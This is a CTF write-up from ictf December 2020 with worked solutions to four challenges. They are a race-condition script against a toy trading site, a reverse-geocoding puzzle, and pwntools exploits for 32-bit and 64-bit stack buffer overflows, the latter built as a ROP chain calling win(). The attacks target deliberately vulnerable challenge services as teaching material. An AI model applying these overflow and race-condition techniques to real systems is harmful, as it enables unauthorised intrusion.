# ictf Dec 2020
## Race Competition
#### Description
> Hey there! One of my friends is running a race competition! Will you get the first place? He also told me that special participants have also the right to claim a flag, but I don't know nothing about tradings...

**Attachments**

https://racecompetition.ctfchallenge.ga/

**Category**

Misc

**Points**

200

#### Explanation
Taking a look around the website, we see that when we input a name it gives us a unique cookie like `name="2337055namehere"`. Clicking "submit" redirects us to the `trade` page on which we can see our money, amount of toys, and options to sell or buy more toys. We can sell as many toys as we want, but we can only buy as much as our balance will allow.

![trade page](https://i.imgur.com/eHn4710.png)

Looking at the source of the page, we find the following comment:
```html
<!-- I only give the flag for those who buy 100 toys!! Muahahaha - ->
```
So now we know that we need to get 100 toys, but we only have enough money for 10 toys. From the name of the challenge and the fact that we have two different process that rely on the same resources (buy and sell both rely on money and amount of toys), we can deduce that this is a [race condition](https://en.wikipedia.org/wiki/Race_condition).
#### Solution
We need a way to tell the server to buy and sell toys at the same time to increase our balance. You could, hypothetically, open two different pages with the same cookie and click "buy" on one and "sell" on the other really fast, but this doesn't sound very fun (or feasible) to me. The easiest way to do it in my opinion is with a really simple python script and a multithreading library:
```python
import requests
from threading import Thread


url = 'http://racecompetition.ctfchallenge.ga/trade/'
cookie = {'name': '<put your cookie here>'}


def buy():
    for x in range(100):
        requests.post(url, data={'action': 'buy'}, cookies=cookie)


def sell():
    for x in range(100):
        requests.post(url, data={'action': 'sell'}, cookies=cookie)


if __name__ == '__main__':
    Thread(target=buy).start()
    Thread(target=sell).start()

    Thread(target=buy).start()
```
I found that starting two buy threads and one sell thread was the most efficient way to do this: one buy and sell thread to take advantage of the race condition, and the extra buy thread to get your toys up to 100 quicker.

![success screenshot](https://i.imgur.com/9gqbkXG.png)

And just like that, we have 100 toys! The flag was in a comment at the bottom of the page's source.

## WorldWide
**Description**
> I am trying to track down Mr. Reddington, the problem is, he doesn't stick to one place. Perhaps he's trying to send Elizabeth a message with the first letter. Note: Thanks to @Zyphen#8624 for this challenge. Also, flag format is all caps, no underscores.

**Attachments**

https://fdownl.ga/51D1AB2DF4

**Category**

Forensics

**Points**

100

#### Solution
We're given a list of latitude and longitude coordinate pairs. We need to concactenate the first letter of the country in which each of the coordinates are located.

To do this programatically, the first thing we need to do is find an API that will give us information about a location based on it's coordinates, also known as reverse geocoding. There are a lot of APIs out there that will do this, but the one that required the least ammout of setup that I found (no rate limits and no API key required) was [OpenStreetMap](openstreetmap.org). Once we have a satisfactory API, it's just a matter of scripting a solution that will print out the flag:
```python
import requests
import json


flag = [(22.351115, 78.667743), (64.686314, 97.745306),(13.800038, -88.914068),(-34.996496, -64.967282),(47.141631, 9.553153),(56.840649, 24.753764),(16.347124, 47.891527),(47.181759, 19.506094),(21.000029, 57.003690),(40.033263, -7.889626),(10.211670, 38.652120),(14.542462, 49.123134),(22.932388, 57.531100),(39.783730, -100.445882),(46.603354, 1.888334),(17.612826, 54.035339),(41.323730, 63.952810),(40.373661, 127.087042),(-2.981434, 23.822264),(17.014904, 54.095697),(-1.964663, 30.064436),(-18.924960, 46.441642),(40.769627, 44.673665),(11.814597, 42.845306),(-1.339767, -79.366697),(-24.776109, 134.755000),(25.624262, 42.352833),(10.273563, -84.073910),(45.985213, 24.685923),(-2.483383, 117.890285),(12.750349, 122.731210),(38.959759, 34.924965)]


def country_first_letter(c: tuple) -> str:
    # API reference: https://nominatim.org/release-docs/develop/api/Reverse/
    r = requests.get(f'https://nominatim.openstreetmap.org/reverse?format=json&lat={c[0]}&lon={c[1]}', headers={'accept-language': 'en-US'})
    country = json.loads(r.text)['address']['country']
    return country[0]


print('ictf{', end='')

for coordinate_pair in flag:
    print(country_first_letter(coordinate_pair), end='')

print('}')
```
Alternatively, an equivalent one-liner:
```python
[print(json.loads(requests.get(f'https://nominatim.openstreetmap.org/reverse?format=json&lat={c[0]}&lon={c[1]}', headers={'accept-language': 'en-US'}).text)['address']['country'][0], end='') for c in flag]
```

## SBO-args-32
**Description**

> Just like the last time, try pwning this one. Note that the remote will not show you the errors or tell you the program terminated. So instead of hammering the remote, test your exploit locally with the file provided and make a fake flag.txt in the same directory as sbo32. Also, use pwntools to make the exploit.

**Attachments**

`nc sbo01.westus2.azurecontainer.io 8080`

https://fdownl.ga/064DDAEFEF

**Category**

pwn

**Points**

150

#### Explanation
It's a binary exploitation challenge. First thing to do is see what we're dealing with:
```
$ file sbo32 && echo && checksec sbo32
sbo32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ad718a524b0878fe7df8d44b37f6d0
8b6dc56294, for GNU/Linux 3.2.0, not stripped

[*] '/mnt/b/CTF/ictf/ictf_r5/sbo32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Note that the NX bit is set. That means that we won't be able to execute from the stack. Fortunately however, the binary isn't stripped. Let's see what functions we're working with in gdb:
```
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x080490d0  printf@plt
0x080490e0  gets@plt
0x080490f0  fgets@plt
0x08049100  getegid@plt
0x08049110  puts@plt
0x08049120  __libc_start_main@plt
0x08049130  setvbuf@plt
0x08049140  fopen@plt
0x08049150  setresgid@plt
0x08049160  _start
0x080491a0  _dl_relocate_static_pie
0x080491b0  __x86.get_pc_thunk.bx
0x080491c0  deregister_tm_clones
0x08049200  register_tm_clones
0x08049240  __do_global_dtors_aux
0x08049270  frame_dummy
0x08049276  win
0x080492ef  vuln
0x0804931b  main
0x08049395  __x86.get_pc_thunk.ax
0x080493a0  __libc_csu_init
0x08049410  __libc_csu_fini
0x08049415  __x86.get_pc_thunk.bp
0x0804941c  _fini
gdb-peda$
```
There are three functions that seem noteworthy: `main`, `vuln`, and `win`. Let's take a look at the decompiled code from each of these functions in Ghidra:
```c
undefined4 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  puts("Let\'s get the party started!");
  vuln();
  return 0;
}
```
Nothing interesting in `main`. It just makes a call to `vuln`, so let's see what `vuln` does:
```c
void vuln(void)
{
  char input [36];

  gets(input);
  return;
}
```
As you can guess from the name of the function, this is where the fun begins. `vuln` sets a buffer of 36 bytes and uses `gets`, which is [vulnerable to buffer overflow](https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351), to fill that buffer. NX is set, so we can't execute from the stack, but we can call the third interesting and aptly-named function, `win`:
```c
void win(int param_1,int param_2)
{
  char flag [36];
  FILE *flag_file;

  flag_file = fopen("flag.txt","r");
  fgets(flag,0x24,flag_file);
  if ((param_1 == 0x1337c0d3) && (param_2 == 0xacc01ade)) {
    printf("%s \n",flag);
  }
  return;
}
```
When `win` is called, it checks it's arguments. If they are `0x1337c0d3` and `0xacc01ade`, it prints out the flag.
#### Solution
To call win with the proper arguments, we just need to know three things:
* The offset from the end of the buffer to the beginning of `EIP` (the register which holds the return address)
* The address for `win` (so we can return into it)
* The two arguments that the program needs (which we already have)

Finding the offset is simple enough and there are many ways to do it. Personally, I'm a big fan of `pattern_create` and `pattern_offset`. This functionality comes preinstalled with [peda](https://github.com/longld/peda). These scripts are really easy to use. When in gdb (with peda), just type `pattern_create 200 input`, which will create a file called `input`. Then run with `r < input`. The program will segfault, and all you have to do is feed the contents of the `EIP` register into `pattern_offset`. Using this method, we can see that it takes 44 bytes to fill the buffer and begin to overwrite `EIP`.

The second step is even easier. Just copy the address of `win` (`0x08049276`) from the output of `info functions` in gdb.

Now that we have everything we need, all that's left is to assemble and send our payload:
```python
from pwn import *

# f = process('./sbo32')
f = remote('sbo01.westus2.azurecontainer.io', 8080)

win_addr = p32(0x8049276)
arg1 = p32(0x1337c0d3)
arg2 = p32(0xacc01ade)

payload = b''
payload += b'A' * 36 # fill the 36-byte buffer
payload += b'B' * 8  # overwrite stuff to get to EIP offset
payload += win_addr  # fil EIP with win address
payload += b'C' * 4  # pad out ret address
payload += arg1      # first argument
payload += arg2      # second argument

f.recvline()

f.sendline(payload)

print(f.recvline())
```

## SBO-args-64
Just like `SBO-args-32`, we need to overflow the buffer in the `main` function and pass two arguments to `win`: `0x1337c0d3` and `0xacc01ade`. Being 64-bit this challenge is very similar to its 32-bit counterpart, but with a few key differences:
*  Addresses are 8 bytes instead of 4
*  function arguments are passed through registers instead of the stack

That first difference is easy enough to deal with: just make addresses longer. It's the second difference that can be really tricky. Since arguments are passed from registers, we need a way to overwrite the correct registers. [x64 calling conventions](https://aaronbloomfield.github.io/pdr/book/x86-64bit-ccc-chapter.pdf) are something worth reading about, but for our purposes we just need to know that the first 2 arguments to a function are read from `RDI` and `RSI` in that order. To accomplish this, we need to find two small snippets of assembly called [ROP gadgets](https://en.wikipedia.org/wiki/Return-oriented_programming), one to pop RDI and one to pop RSI:
```
$ ROPgadget --binary sbo64 | egrep "rdi|rsi"
0x0000000000401186 : or dword ptr [rdi + 0x404068], edi ; jmp rax
0x0000000000401373 : pop rdi ; ret
0x0000000000401371 : pop rsi ; pop r15 ; ret
```
Both of these gadgets call `ret` after popping from the stack, which allows us to chain them together. At this point, our exploit works something like this:
1. Fill the buffer with 44 bytes
2. Overwrite the space between the buffer and `RIP`, the return address, with 12 bytes
3. Fill `RIP` with the location of our first gadget, which will pop the top of the stack into `RDI`
4. Put our first argument at the top of the stack so it gets popped by the first gadget
5. Fill the return address of the first gadget with the location of the second gadget
6. Put our second argument at the top of the stack so it gets popped into `RSI`
7. Fill `R15` with something (doesn't matter what)
8. Fill the return address of the second gadget with the address of `win`

`win` will read the arguments it needs from `RDI` and `RSI` and it will print out the flag. Easiest way to put all of this together is with pwntools and a simple python script:
```python
from pwn import *

# f = process('./sbo64')
f = remote('sbo02.westus2.azurecontainer.io', 8080)

gadget1 = p64(0x0000000000401373)  # pop rdi ; ret
gadget2 = p64(0x0000000000401371)  # pop rsi ; pop r15 ; ret
win_addr = p64(0x401216)
arg1 = p64(0x1337c0d3)
arg2 = p64(0xacc01ade)

payload = b''
payload += b'A' * 56 # fill buffer and offset
payload += gadget1   # returns into our first gadget which pops RDI
payload += arg1      # first argument
payload += gadget2   # returns into our second gadget which pops RSI
payload += arg2      # second argument
payload += b'B' * 8  # fill R15 with something
payload += win_addr  # fill RIP with win address

payload = (b'A' * 56) + gadget1 + arg1 + gadget2 + arg2 + b'B' * 8 + win_addr

f.recvline()
f.sendline(payload)
print(f.recvall())
```
